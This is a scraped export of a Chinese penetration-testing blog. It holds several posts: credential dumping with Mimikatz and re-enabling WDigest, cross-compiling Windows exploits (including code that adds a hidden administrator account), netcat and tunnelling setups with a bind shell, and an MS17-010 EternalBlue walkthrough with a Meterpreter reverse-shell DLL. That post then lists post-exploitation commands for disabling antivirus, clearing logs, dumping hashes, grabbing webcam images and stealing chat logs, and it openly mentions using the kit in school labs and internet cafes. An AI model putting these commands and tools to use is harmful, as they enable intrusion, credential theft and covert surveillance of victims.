!+mimikatz# !processprotect /process:lsass.exe /removemimikatz# sekurlsa::logonpasswords\n\n\n\n禁止Wdigest Auth缓存明文密码Microsoft发布了一个补丁KB2871997，安装此补丁后，允许用户在注册表中配置一个设置（高版本已默认配置）禁用 WDigest 身份验证，从而防止将明文密码存储在内存中。此时mimikatz用抓取时密码字段会显示为null，如下：\nSID : S-1-5-21-1611409294-1731084229-990987755-1000        wdigest :         * Username : ssooking         * Domain   : SSOOKING34EC         * Password : (null)        kerberos :         * Username : ssooking         * Domain   : SSOOKING34EC         * Password : (null)        ssp :        credman :\n\n绕过方法是开启WDigest身份验证，使用户重新登录，从而是内存中重新存储明文密码。修改注册表键值（也可以使用其他相关工具）：\n# regreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#mimikatzsekurlsa::wdigest# cme cme smb 17.10.0.10 -u administrator -H &lt;hash&gt; --wdigest enable\n\n在开启 Wdigest Auth 后，需要重启或者强制锁屏，让管理员重新登录。锁屏命令：\nrundll32 user32.dll,LockWorkStation#如果等待，也可以强制登录让其下线迫使其输入密码cme smb 17.10.0.10  -u administrator -p -H &lt;hash&gt; -x qusercme smb 17.10.0.10  -u administrator -p -H &lt;hash&gt; -m mimikatz.py -x quser\n\n\n\n其他会缓存密码的情况：\n\n当域控制器 (DC) 不可访问时，Kerberos 将保留密码以供将来登录尝试。\n当HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest,UseLogonCredential (DWORD)设置为1 时，WDigest 将保留凭据。\n当HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Credssp\\PolicyDefaults设置为allow 时，凭据安全支持提供程序 (CredSSP) 将保留凭据\n当HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation设置为allow 时，CredSSP&#x2F;tspkgs 将保留凭据。\n\n参考\n你并不懂 Mimikatz Part 1 - Wdigest SSP\n\nhttps://www.sikich.com/insight/easy-wins-for-active-directory-part-3/\n\nhttps://cloud.tencent.com/developer/article/1838785\n\nCREDENTIAL DUMPING PART 2: HOW TO MITIGATE WINDOWS CREDENTIAL STEALING\n\n\n","categories":["神兵利器"],"tags":["Mimikatz","Credential-Dumping"]},{"title":"kali环境下编译Windows EXP","url":"/2019/12/kali%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91windows-exp/","content":"MinGW-w64MinGW-w64是一个开源的C&#x2F;C++编译器，利用MinGW-w64可以实现在Linux环境下编译Windows可执行文件。\n安装Mingw-w64：\nsudo apt-get install mingw-w64\n\nWin32和Win64是两种不同的体系结构，对于Win32，Mingw-w64名为i686-w64-mingw32-gcc，对于Win64，则名为x86_64-w64-mingw32-gcc。安装完毕后：\n# Ci686-w64-mingw32-gcc\t# 32-bitx86_64-w64-mingw32-gcc\t# 64-bit# C++i686-w64-mingw32-g++\t# 32-bitx86_64-w64-mingw32-g++\t# 64-biti686-w64-mingw32-gcc [source file] –o [output file: .exe] &lt;–lws2_32&gt;i686-w64-mingw32-g++ [source file] –o [output file: .exe]i586-migw32msvc-gcc reverse.c -o custom-reverse.exe -lws2_32\n\n与gcc有所区别的是，gcc编译时加上 -m32 生成 32 位可执行程序，加上 -m64 生成 64 位可执行程序。\n测试代码编译useradd.c\n#include &lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */int main()&#123;\tint i;\ti=system (&quot;net user test1 123456 /add &amp;&amp; net localgroup administrators test1 /add&quot;);\treturn 0; &#125;\n\n编译\ni686-w64-mingw32-gcc useradd.c -o u1.exe\n\n\n\nEXP编译测试CVE-2011-1249（MS11-046），此版本Windows操作系统在辅助功能驱动程序（AFD）中包含一个漏洞，该漏洞允许经过身份验证的非管理用户提升特权。针对其exp代码进行编译：\nwget https://www.exploit-db.com/download/40564 -O 40564.ci686-w64-mingw32-gcc 40564.c -o afd.exe –lws2_32\n\n另外，还有很多exp是python写的，可以在Windows环境下安装pyinstaller等工具，把py程序转换成exe程序。可参考本博客：python打包exe 。\n参考\nhttps://arrayfire.com/cross-compile-to-windows-from-linux/\nhttps://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/\n\n","categories":["攻防渗透"],"tags":["kali","OSCP"]},{"title":"iptables NAT转发","url":"/2020/03/iptables-nat%E8%BD%AC%E5%8F%91/","content":"NAT一. 什么是 NATNAT（Network Address Translation）译为网络地址转换。通常路由器在转发我们的数据包时，仅仅会将源MAC地址换成自己的MAC地址，但是NAT技术可以修改数据包的源地址、目的地址以及源端口、目的端口等信息。\n二. NAT的作用NAT技术最常见的应用就是通过修改源IP地址实现内网多主机使用一个公网地址接入互联网。NAT技术通常用于端口和流量的转发、重定向，实现如端口映射、跨网络访问、流量代理等功能。\n二. iptables实现NAT转发1.语法及参数介绍iptables  [-t TABLE]  COMMAND  CHAIN  [num]  匹配条件  -j  处理动作\n要使用iptables的NAT功能，我们首先需要启用网卡的IP转发功能\necho 1 &gt; /proc/sys/net/ipv4/ip_forward\n如果想要永久生效，我们要编辑/etc/sysctl.conf文件，设置net.ipv4.ip_forward = 1，然后用sysctl  -p 命令使配置文件生效。\n我们使用**-t nat**参数指明使用nat表，因为iptables默认使用filter表。nat表同filter表一样有三条缺省的”链”(chains)：\nPOSTROUTING：定义进行源地址转换规则，重写数据包的源IP地址PREROUTING：定义进行目的地址转换的规则，可以把外部访问重定向到其他主机上OUTPUT：定义对本地产生的数据包的目的转换规则。\n我们要利用iptables进行NAT转换时，使用的动作主要为SNAT、DNAT和REDIRECT：\nSNAT：源地址转换DNAT：目的地址转换REDIRECT：端口重定向\n(1) 规则操作\n-A：在链的尾部添加一条规则-D CHAIN [num]: 删除指定链中的第num条规则-I CHAIN [num]：在指定链内第num条位置插入一条规则-R CHAIN [num]: 替换链内指定位置的一条规则\n(2) 源&#x2F;目的IP地址\n-s：指定源地址--dst：指定目的地址\n\n(3) 网络接口\n-i：入站接口。对于`PREROUTING`链，只能用-i指定进来的网络接口-o：出站接口。对于POSTROUTING和OUTPUT，只能用-o指定出去的网络接口\n(4) 动作\nACCEPT：放行DROP：丢弃REJECT：拒绝MASQUERADE：地址伪装LOG：日志MARK：标记\n\n三. 源&#x2F;目的转发实例1.源NAT（SNAT）更改所有来自192.168.1.0&#x2F;24的数据包的源IP地址为123.4.5.100\niptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to 123.4.5.100\n2.目的NAT（DNAT）更改所有来自192.168.1.0&#x2F;24的数据包的目的ip地址为123.4.5.100\niptables -t nat -A PREROUTING -s 192.168.1.0/24 -i eth1 -j DNAT --to 123.4.5.100\n3.IP映射实例假设有这样的情况：A、B单位给自内网中部分用户要求建立自己的Web服务器对外发布信息。我们可以在防火墙的外部网卡上绑定多个合法公网IP地址，然后通过ip映射使发给其中某一个IP地址的包转发至内部某一用户的Web服务器上，并将该内部Web服务器的响应包伪装成该公网IP发出的包。\n\n\n\n节点\n内网IP\n公网IP\n\n\n\nA单位Web服务器\n192.168.1.100\n123.4.5.100\n\n\nB单位Web服务器\n192.168.1.200\n123.4.5.200\n\n\nlinux防火墙\n192.168.1.1（eth1）\n123.4.5.1（eth0）\n\n\n在进行NAT之前，我们需要先将分配给A、B单位的公网ip绑定到防火墙的外网接口：\nifconfig eth0 add 123.4.5.100 netmask 255.255.255.0ifconfig eth0 add 123.4.5.200 netmask 255.255.255.0\n对防火墙接收到的目的ip为123.4.5.100和123.4.5.200的所有数据包进行目的NAT(DNAT):\niptables -A PREROUTING -i eth0 -d 123.4.5.100 -j DNAT --to 192.168.1.100iptables -A PREROUTING -i eth0 -d 123.4.5.200 -j DNAT --to 192.168.1.200\n其次，对防火墙接收到的源ip地址为192.168.1.100和192.168.1.200的数据包进行源NAT(SNAT):\niptables -A POSTROUTING -o eth0 -s 192.168.1.100 -j SNAT --to 123.4.5.100iptables -A POSTROUTING -o eth0 -s 192.168.1.200 -j SNAT --to 123.4.5.200\n这样，所有目的ip为123.4.5.100和123.4.5.200的数据包都将分别被转发给192.168.1.100和192.168.1.200;而所有来自192.168.1.100和192.168.1.200的数据包都将分别被伪装成由123.4.5.100和123.4.5.200，从而也就实现了ip映射。\n四.端口转发实例1.本机端口转发把发往本机80端口的数据重定向到8080端口\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n2.远程端口转发把访问123.4.5.100:8080的数据包转发到123.4.5.200:80\niptables -t nat -A PREROUTING -d 123.4.5.100 -p tcp --dport 8080 -j DNAT --to-destination 123.4.5.200:80\n\n多网卡问题：iptables学习笔记：端口转发命令优化\n","categories":["攻防渗透"],"tags":["流量转发"]},{"title":"nc端口转发","url":"/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","content":"网络情况\n\n\n主机\nIP\n类型\n\n\n\nmacOS\n192.168.10.100\n攻击机\n\n\nkali\n192.168.19.147\n跳板机\n\n\nUbuntu\n192.168.19.153\n目标机\n\n\n端口转发实验ps: nc每次请求连接建立后都会关闭，即单次连接。每次连接过后，都需要重新执行一次nc转发命令。解决方法见后文。\n且nc命令在第一个远程连接结束后会结束监听。如果需要保持运行，需要添加-k参数。\n场景1：正向转发1macOS能访问kali，但是不能访问Ubuntu。kali能访问Ubuntu任意端口。\n目标：macOS想访问到Ubuntu的22端口。\n思路：用kali做跳板机，把访问kali 8888端口的数据转发到Ubuntu的22端口\n方法：在kali上执行一条nc转发命令即可\nnc -l -p 8888 -c &quot;nc 192.168.19.153 22&quot;#或者使用管道符mkfifo /tmp/pipe &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe#ormknod /tmp/pipe p &amp;&amp; nc -l -p 8888 &lt; /tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe\n\n此时在macOS上用ssh连接kali的8888端口，或者直接在kali上ssh连接本地8888端口，即可登陆Ubuntu的22端口。\nssh -p 8888 username@192.168.19.147\n\n\n\n场景1：正向转发2macOS能访问kali，但是不能访问Ubuntu。Ubuntu防火墙有过滤，kali不能访问Ubuntu的22端口，但是可以访问其他端口如9999。\n目标：macOS想访问到Ubuntu的22端口。\n思路：\n\n目标机器Ubuntu上用nc把22端口转发到9999端口\nkali上监听8888端口，并使用nc把访问kali 8888端口的数据转发到Ubuntu的9999端口\nmacOS通过访问kali的8888端口，即可正向连接到ubuntu的22端口。\n\n操作：\n目标Ubuntu：\nnc -l -p 9999 -c &quot;nc 127.0.0.1 22&quot;#如果没有-c参数mkfifo /tmp/pipe &amp;&amp; nc -l -p 9999 &lt;/tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe# ormkfifo /tmp/pipe &amp;&amp; nc -k -l 9999 0&lt;/tmp/pipe | nc localhost 22 | tee /tmp/pipe\n\n跳板机kali：\nnc -l -p 8888 -c &quot;nc 192.168.19.153 9999&quot;#或者使用管道符mkfifo /tmp/pipe &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 9999 &gt;/tmp/pipe#ormknod /tmp/pipe p &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 9999 &gt;/tmp/pipe\n\n攻击机：macOS：\nssh -p 8888 username@192.168.19.147\n\n\n\n解决nc单次连接问题常见nc版本\n\nnc、ncat、netcat\n\nnc -c  netcat-traditional\n\n\nncwhile :; do (nc -l -p 8888 -c &quot;nc 192.168.19.153 22&quot;); donewhile [ 1 ]; do nc -l -p 8888 -c &quot;nc 192.168.19.153 22&quot;; donewhile [ 1 ]; do mkfifo /tmp/pipe &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe; done\n\nsocat# 本地转发socat tcp-l:8888,reuseaddr,fork tcp:localhost:22# 远程转发socat tcp-l:8888,fork,reuseaddr tcp:192.168.19.153:22\n\nncathttps://nmap.org/ncat/\n当客户端与服务器断开连接时，服务器也会停止监听，可以通过选项’k’强制服务器保持连接状态并继续侦听端口：\n#Now all the connections for port 80 will be forwarded to port 8080.ncat -u -l 80 -c  &#x27;ncat -u -l 8080&#x27;ncat -l -k localhost 8080 --sh-exec &quot;ncat example.org 80&quot;\n\nnetcathttp://netcat.sourceforge.net/download.php\nnetcat -l -p 1234 -e /bin/bash# 把访问某个端口的数据转发到本地或远程端口netcat -L 127.0.0.1:22 -p 8080 -vvvnetcat -L 192.168.10.1:80 -p 25000 -vvv\n\n\n\nnc结合ssh\nmkfifo pipenc -l -p 8080 &lt; pipe | ssh gw_to_private_net -p 22977  &quot;nc 192.168.12.230 80&quot; | tee pipe\n\n\n\n\n\n常见nc端口转发命令：\nnc -v -lk -p 8001 -e /usr/bin/nc 127.0.0.1 8000\n\n此外还可能遇到不支持某些参数的情况，可以使用多管道传输。\nOSX：\nmkfifo amkfifo bnc 127.0.0.1 8000 &lt; b &gt; a &amp;nc -l 8001 &lt; a &gt; b &amp;\n\n在OS X bash上使用双向管道。该命令也可能在其他Unix上运行：\nnc 127.0.0.1 8000 &lt;&amp;1 | nc -l 8001 &gt;&amp;0\n\nLinux：\nmkfifo backpipenc -l 12345 0&lt;backpipe | nc www.google.com 80 1&gt;backpipe\n\n\n\nReference\nhttps://unix.stackexchange.com/questions/293304/using-netcat-for-port-forwarding\nhttps://unix.stackexchange.com/questions/10428/simple-way-to-create-a-tunnel-from-one-local-port-to-another\nhttps://hakin9.org/playing-with-the-ports-redirection/\nhttps://jtway.co/netcat-with-ssh-port-forwarding-148177b2e850\n\n","categories":["攻防渗透"],"tags":["端口转发"]},{"title":"内网流量代理","url":"/2020/05/%E5%86%85%E7%BD%91%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/","content":"sSocket下载地址：https://sourceforge.net/projects/ssocks/\n\n​    一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务。\n\nvps监听1088端口：\nrcsocket.exe –l 1088 –p 8888 –vv\n\n内网目标机器执行：\n./rssocks –vv –s VPSip:8888\n\n\n\nFRPfrp下载链接：https://github.com/fatedier/frp/releases\nfrps上传到服务器上；frpc是要放到目标机上。\n1、配置服务端\n修改frps.ini服务器端配置文件\n[common]bind_port = 10800\n\n2、配置客户端\n修改frpc.ini客户端配置文件：\n[common]server_addr = 110.120.90.80server_port = 10800[socks5]type = tcpremote_port = 10800plugin = socks5use_encryption = trueuse_compression = true\n\n3、启动\n先启动服务端：./frps -c ./frps.ini再启动客户端：./frpc -c ./frpc.ininohup sudo ./frps -c frps.ini &gt; log 2&gt;&amp;1 &amp;\n\n4、设置代理工具，连接到vps公网ip的10800端口\n5、开机自启\nLinux环境下，frp只能通过systemd方式自启。\nfrp_0.34.3_linux_amd64.tar.gz 解压之后可以看到一个 systemd 目录，将其中的 frps.service 文件复制到服务器的 /etc/systemd/system/ 目录下，并修改 ExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini。\n[Unit]Description=frpcWants=network-online.targetAfter=network.target network-online.targetRequires=network-online.target[Service]ExecStart=/home/pi/github/frp_0.33.0_linux_arm/frpc -c /home/pi/github/frp_0.33.0_linux_arm/frpc.ini#ExecStart=/home/pi/github/frp_0.33.0_linux_arm/run.shExecStop=/bin/kill $MAINPIDRestart=alwaysRestartSec=5StartLimitInterval=0[Install]WantedBy=multi-user.target\n\n命令\n#重新加载配置文件sudo systemctl daemon-reload       #service文件改动后要重新reload一下（类似刷新到缓存里）sudo systemctl enable frp.service  #设置开机启动sudo systemctl status frp.service  #查询自启状态\n\n\n\nCobaltStrikebeacon &gt; socks 1024 #端口根据VPS实际情况进行设置\n\nCs菜单栏View &gt; Proxy Pivots，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。\nPystingerPystinger\n\n毒刺(pystinger)通过webshell实现内网SOCK4代理, 端口映射.可直接用于metasploit-framework, viper, cobalt strike上线.主体使用python开发, 当前支持php, jsp(x), aspx三种代理脚本.\n\n\n上传代理脚本到目标服务器\n\n在目标主机执行命令开启stinger_server服务\n# Windowsstart stinger_server.exe# Linuxchmod +x stinger_server &amp;&amp; ./stinger_server\n\n在公网vps上执行命令打通隧道\n./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000\n\n此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理\n\n此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020\n\n用proxychains验证socks4a代理是否工作正常\n\n\nSunny-Ngrok官网链接：http://ngrok.cc/\n支持HTTPS、TCP、UDP流量转发。使用方式参考官方文档。\n\n首先在Ngrok官网进行账号注册\n注册完进入系统，访问开通隧道，选择免费服务：\n进行隧道配置\n隧道协议\n隧道名称：随意\n前置域名：随意，默认域名后缀为ngrok.cc\n本地端口\n\n\n配置完毕并添加后，服务器自动分配了一个免费域名用于与目标站点进行映射\n在隧道管理中，点击”客户端下载”，并将客户端工具sunny.exe上传至目标服务器\n在目标服务器执行sunny，建立隧道连接：sunny.exe clientid 隧道id\n此时在公网访问 Ngrok 服务器分配给我们的域名即可访问到服务器。\n\n类似的一个，不过仅支持HTTP(s)和WSS协议：https://natapp.cn/\nEarthworm官网链接：http://rootkiter.com/EarthWorm/\n正向socks5代理\n./ew -s ssocksd -l 1080\n\n直接代理工具直接设置为目标IP的1080端口即可\n反向socks5代理\n公网VPS添加隧道，把本地1080端口收到的代理请求转交给8888端口\n./ew_linux_x64 -s rcsocks -l 1080 -e 8888\n\n目标主机开启反弹socks服务，连接公网机器\n./ew_linux_x64 -s rssocks -d 公网VPS的IP -e 8888\n\n现在通过公网VPS主机的8888端口可以直接访问内网\n多级代理\n参考官网文档。\nvenom官网链接：https://github.com/Dliv3/Venom\n多级网络流量代理工具，可进行端口转发、端口复用、交互式shell等。\nadmin&#x2F;agent命令行参数\nadmin节点和agent节点均可监听连接也可发起连接\nadmin监听端口，agent发起连接:\n./admin_macos_x64 -lport 9999\n\n./agent_linux_x64 -rhost 192.168.0.103 -rport 9999\n\nagent监听端口，admin发起连接:\n./agent_linux_x64 -lport 8888\n\n./admin_macos_x64 -rhost 192.168.204.139 -rport 8888\n\n节点间通信加密\nVenom提供节点间通信加密功能，用户可通过-passwd选项指定密码，该密码用于生成AES加密所需的密钥。\n# 通过-passwd指定密码为dlive@dubhe./admin_macos_x64 -lport 8889 -passwd dlive@dubhe# agent指定相同的密码与admin节点连接./agent_macos_x64 -rhost 192.168.0.103 -rport 8889 -passwd dlive@dubhe\n\n参考\nhttps://gofrp.org/docs/features/common/authentication/\n\nhttps://gitee.com/wefeng/frp\n\nhttps://sanii.cn/article/306\n\n实战中内网穿透的打法\n\n\n","categories":["攻防渗透"],"tags":["流量代理"]},{"title":"内网端口转发","url":"/2020/01/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","content":"netcat把本地的8081端口的访问转移到8888号\nmknod tunnel p 　　#创建一个临时的管道文件tunnelnetcat -l -p 8081 0 &lt; tunnel | netcat -l -p 8888 | tee tunnel\n\n\n\nsocat把所有本地的80号转移到10.0.0.1的8080上\nsocat -d -d -l TCP4-LISTEN:80,reuseaddr,fork,su=nobody TCP4:10.0.0.1:8080\n\n将本地80端口转发到远程的80端口\nsocat TCP-LISTEN:80,fork TCP:www.domain.org:80\n\n\n\nLCX将内网的3389端口转发到公网的51端口\n内网机器：lcx.exe –slave 公网IP 端口 内网IP 端口　　\n\n监听51端口，转发到公网机器的3389端口\n公网机器：lcx.exe –listen 51 3389　\n\n我们在本地机器上远程公网IP+3389 ，就连接上了内网机器的3389\n","categories":["攻防渗透"],"tags":["端口转发"]},{"title":"利用Pentestbox打造MS17-010移动杀器","url":"/2017/04/%E5%88%A9%E7%94%A8pentestbox%E6%89%93%E9%80%A0ms17-010%E7%A7%BB%E5%8A%A8%E6%9D%80%E5%99%A8/","content":"本文首发Freebuf，属原创奖励计划，未经许可禁止转载。\n链接：http://www.freebuf.com/articles/system/132274.html\n一. 前言　　前段时间Shadow Broker披露了 Windows大量漏洞，甚至爆出黑客组织 Equation Group 对于Windows 远程漏洞 MS17-010 的利用工具，该漏洞影响范围之广，堪称杀器。可以看看官方通告https://technet.microsoft.com/zh-cn/library/security/ms17-010.aspx\n　　于是想着把攻击环境移植到u盘里，然后比如去学校机房，网吧。。。。。。\n　　这里分享一下个人的移植过程，以及在使用攻击代码过程中遇到的问题。\n二. 环境移植过程思路就是利用现成的神器pentestbox，向里添加攻击代码以及其运行需要的pytho环境\nPentest Box是一款Windows平台下预配置的便携式开源渗透测试环境，集成了各种编译运行环境，具体的可以到网上了解一下。\n\n工具准备：\n\nPentestbox:\nhttps://pentestbox.org/zh/\n方程式工具包: \nEQGRP_Lost_in_Translation\nhttps://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master\npython环境\n必须在Python2.6  和 pywin32-221环境下，如果你用其他环境，会报各种诸如模块&#x2F;dll缺失等错误\n\nPython2.6  和 pywin32-221位数需要相同，我用的是32位的\nPython2.6.6 （32） \n下载链接：https://www.python.org/download/releases/2.6.6/\npywin32-221（32）\n下载链接：\nhttps://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download\n\nPentestbox下python2.6环境配置\n\n分别安装，然后你会得到攻击包运行的python2.6环境\n\n在Python26\\Lib\\site-packages目录下，你会发现插件也已经安装\n\n然后把python26这个文件夹拷贝到你的pentestbox环境变量目录下：Pentestbox\\base\n刚才你也可以直接装到pentestbox\\base下\n\n然后我们添加python2.6环境变量,在Pentestbox \\config\\alias文件中加一行\npython26&#x3D;”%pentestbox_ROOT%\\base\\Python26\\python.exe” $*\n\n然后我们启动pentestbox，由于pentestbox通过线程注入挂钩cmd.exe来调用系统命令，因此杀软可能会提示警告，信任即可。\n\n这个时候，我们运行python26可以看到环境配置成功\n\n\\3. 漏洞利用工具配置\n我们下载EQGRP_Lost_in_Translation工具包,修改windows目录下fb.py，去除不必要的代码\n\n\n然后我们把windows文件夹复制到pentestbox目录下\n \n这里我把windows里的文件放到pentestbox根目录下的ms17-010文件夹内\n\n我们进入ms07-010目录并执行python26 fb.py\n\n这样我们就可以启动攻击程序了\n\n三. 攻击示例攻击机：192.168.1.106\n靶机： 192.168.1.111   windows x64 SP1\n我们先用msf生成dll木马，用于控制目标\nmsfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xxxx  LPORT&#x3D;9999 -f dll &gt; 9999-64.dll\nPentestbox里自带的metasploit框架我在使用总是时出现问题，我一般不用它，我通常是在自己的vps服务器进行监听\n本地测试时候可以找一台kali攻击机\ndll木马我们可以提前生成好放在u盘里带着，随时备用*_*\n接下来我们用Msf进行监听\n**　　use exploit&#x2F;multi&#x2F;handler**\n**　　set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp**\n**　　set LHOST IP**     (这里填写vps的内网ip，记得开放监听端口)\n**　　set LPORT 9999**\n**　　set stagerverifysslcert false**\n**　　exploit -j**\n\n如果没有设置set stagerverifysslcert false，获取shell的时候可能会出现这样的情况\n\n回到fb.py中，开始攻击\n[?] Default Target IP Address [] :              攻击目标\n[?] Default Callback IP Address [] :            本机ip\n[?] Use Redirection [yes] : no                    是否重定向\n[?] Base Log directory [D:\\logs] :            是否输出日志\n然后创建一个项目实例\n\n如果你之前创建过实例，可以选择它，改设置，也可以重新创建一个\n\n 输入命令 use 可以查看我们利用的exp模块\n我们使用EternalBlue模块，use EternalBlue\n\n下面一直回车就行。。。\n\n选择攻击目标的系统\n\n这里会询问你payload传输方式  选择1，感觉更稳定些\n\n\n继续回车，确认信息\n\n \n成功之后，我们使用doublepulsar模块\n\n继续一路回车\n\n 选择协议\n\n 选择目标系统\n\n选择攻击方式，我们利用dll木马\n\n设置dll木马路径，我已经提前生成好放在u盘里随身携带，随时备用~\n\n\n然后设置要注入的程序，默认是lsass.exe\n \n这里注入的进程会对目标造成影响，也试了几个其他程序，比如注explorer时候，会弹出一个报错框\n注入其他进程，有时候或多或少都会出那么点问题\n\n\n然后是一路回车\n\n\n\n最后一步执行攻击\n\nMsf这里成功获取shell\n\n\n截个屏看看\n\n\n一个正在成长中的团队，欢迎交流，分享，合作~\n四. 后渗透辅助命令配合下面的一些命令，happy to play~\nmeterpreter\nupload &#x2F;root&#x2F;nc.exe c:\\windows\\system32　　#上传文件\nsearch –d c:\\windows –f *.mdb        　　 　　#在目标主机Windows目录中搜索文件s\n执行程序\nexecute -H -i -f cmd.exe #隐藏执行cmd并与之交互\nexecute -H -m -d calc.exe -f wce.exe -a “-o foo.txt”                   #隐藏执行，并显示虚假运行程序\n我们可以用远控生成一个木马传过去\n\n\n\n例：下载目标聊天记录到本地&#x2F;tmp目录下，可用Qqlogger查看\ndownload c:\\\\Programs Files\\\\Tecent\\\\QQ\\\\Users\\\\qq号\\\\Msg2.0.db /tmprun webcam -p 图片保存路径        　　#开启目标摄像头并截图run packetrecorder –i 会话序号 　　#捕获流量数据包.pcap提权use privsgetsystemgetuidclearev --清除日志  run killav --干掉杀软        文件关联改变文件类型关联DLL到 txt文件类型： assoc .dll=txtfile改变文件类型关联EXE 到png文件类型： assoc .exe=pngfile改变文件类型关联MP3到jpg文件类型： assoc .mp3=jpgfileHash获取hashdump或run hashdump或run smart_hashdump&gt;run post/windows/gather/hashdump&gt;run /windows/gather/smart_hashdump        --可绕过windows UAC控制用kiwi获取明文密码：meterpreter&gt;load kiwimeterpreter&gt; creds_allMetaspolit中使用Mimikatz:使用metasploit内建的命令：meterpreter &gt; load mimikatzmeterpreter &gt; msv   #msv credenmeterpreter &gt; kerberostials #kerberos credentials使用mimikatz自带的命令：meterpreter &gt; mimikatz_command -f samdump::hashesmeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords&lt;前面一句命令在密码超过14位时LM会为空，后一句命令可以得到明文&gt;利用windows命令下载文件bitsadmin /transfer mydownJob /download /priority normal “[http://url/muma.exe&quot;](http://url/muma.exe)   &quot;F:\\muma.exe &quot;详细用法可参考：https://technet.microsoft.com/zh-cn/library/cc753856(v=ws.10).aspx\n\n最后：\n今天下午有人在i春秋发布了批量利用程序\nhttps://bbs.ichunqiu.com/thread-21863-1-1.html~\n","categories":["Pentestbox"],"tags":["攻防渗透"]},{"title":"绕CDN找源站","url":"/2020/03/%E7%BB%95cdn%E6%89%BE%E6%BA%90%E7%AB%99/","content":"CDN介绍CDN（Content Delivery Network）内容分发网络，是一种利用分布服务器集群组成流量分配管理网络平台，从而提高用户访问速度的技术。目前有很多厂家能提供这种服务，如Amazon CloudFront、阿里云CDN等。收费上，CDN服务主要是按宽带收、和按请求数收费。\n在渗透测试过程中，经常会遇到云WAF会与CDN一起使用的情况。由CDN进行域名解析，指向WAF，最后再到源站，如Cloudflare、阿里云WAF等，通用部署方法可以参考同时部署WAF和CDN。遇到这种情况时，给渗透测试带来了很大阻碍，我们可以尝试绕过CDN找到其源站的真实地址，从而直接绕过WAF直接访问目标源站进行渗透工作。\n判断是否存在CDN首先我们需要确认目标网站是否使用了CDN服务。\n1、多地ping\n通过多地区同时ping目标域名，对比IP地址是否相同，如果ping出来的IP地址不同，则可能使用了CDN服务。常用在线工具：\n\nhttp://ping.chinaz.com/\nhttps://www.17ce.com/\nhttps://asm.ca.com/en/ping.php\nhttps://www.cdnperf.com/tools/cdn-latency-benchmark\n\n2域名解析\n使用nslookup或dig命令对域名进行解析，一方面查看是否解析出多个IP，注意这些IP归属地是否是CDN服务商的IP。另一方面，如果使用了CDN或者WAF，通常会解析到特殊主机记录，如下则是使用了cloudflare和云盾的DNS解析结果：\n$ dig hostadvice.com NS.....;; ANSWER SECTION:hostadvice.com.        86400    IN    NS    phil.ns.cloudflare.com.hostadvice.com.        86400    IN    NS    eva.ns.cloudflare.com......$ nslookup xxxxx.cnServer:        10.16.0.222Address:    10.16.0.222#53Non-authoritative answer:xxxxx.cn    canonical name = n2tgyckbgrmqfinzwtdhzketipcvyyv1.yundunwaf2.com.Name:    n2tgyckbgrmqfinzwtdhzketipcvyyv1.yundunwaf2.comAddress: 47.110.175.169\n\n3、在线工具判断\nhttp://www.cdnplanet.com/tools/cdnfinder/https://www.ipip.net/ip.html\n\n绕过CDN查找网站真实IP如果确认存在CDN，就该考虑如何去绕过从而找到目标的真实IP。通常思路有以下几个：\n\nDNS历史解析记录\n子&#x2F;父域名查询\n网络空间安全引擎搜索\n信息泄露\nSSL证书信息\n服务器探针文件、git&#x2F;svn信息泄露、报错信息、日志信息等\n\n\nSSRF漏洞\n邮件头信息\n让服务器发送邮件，查看邮件头信息\n给服务器发送一封错误的邮件地址信息，看是否有错误回复\n\n\n国外主机解析域名\n网站APP\n全网扫描对比banner：zmap、masscan\n\nDNS历史解析记录我们可以查询域名历史上解析到过哪些IP，因为在使用CDN之前，域名解析过的IP很可能是服务器的真实IP地址。\n常用在线工具：\n\nSecurityTrails\n微步在线\nhttps://viewdns.info/iphistory/ 